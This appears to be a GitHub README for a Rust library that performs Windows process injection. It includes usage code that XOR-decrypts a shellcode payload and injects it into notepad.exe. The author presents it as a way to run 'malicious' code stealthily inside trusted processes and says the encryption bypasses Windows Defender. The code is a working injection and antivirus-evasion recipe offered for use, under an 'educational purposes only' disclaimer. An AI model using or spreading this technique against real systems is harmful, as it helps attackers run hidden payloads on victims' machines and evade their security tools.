# Rust Process Injection (Windows Only)
[Documentation](https://swiiz.github.io/needle-rs/needle/index.html) - [Apache 2.0 License](https://github.com/Swiiz/needle-rs/blob/main/LICENSE) - [Author](https://github.com/Swiiz)

> Process injection is a technique used to execute arbitrary code in the address space of a separate live process. It is commonly used in both legitimate applications, such as debugging tools, and malicious activities, such as malware attacks. The main goal of process injection is to manipulate the target process to run the injected code with the same permissions and context as the original process, often to evade detection and security measures.

Allows for running "malicious" code stealthily within the context of trusted processes, bypassing security controls. 

## How to use:
```TOML
# Cargo.toml
# ...
[dependencies]
needle = { git = "https://github.com/Swiiz/needle-rs.git", features = [ "windows" ] }
```
```RUST
use needle::{
    cypher::{PayloadCypher, XorCypher},
    find_process, inject, Shellcode,
};

const SHELL_CODE: &[u8] = include_bytes!("YOUR_PAYLOAD.bin");
const KEY: u8 = 0x42;

fn main() {
    let payload = XorCypher::<Shellcode>::from_encrypted(SHELL_CODE, KEY); // The payload is encrypted one time using  XorCypher -> Allows for bypassing windows defender on my machine

    let process = find_process("notepad.exe").expect("Target process not found"); // Find a process with the name "notepad.exe"
    if let Err(e) = inject(process, payload) { // Inject the payload
        println!("Could not inject payload: {}", e);
    }
}

```
**If anyone is interested in implementing other platforms/methods/cyphers, please feel free to contribute 👍**

## Disclaimer
Information and code provided on this repository are for educational purposes only. The creator is in no way responsible for any direct or indirect damage caused due to the misuse of the information.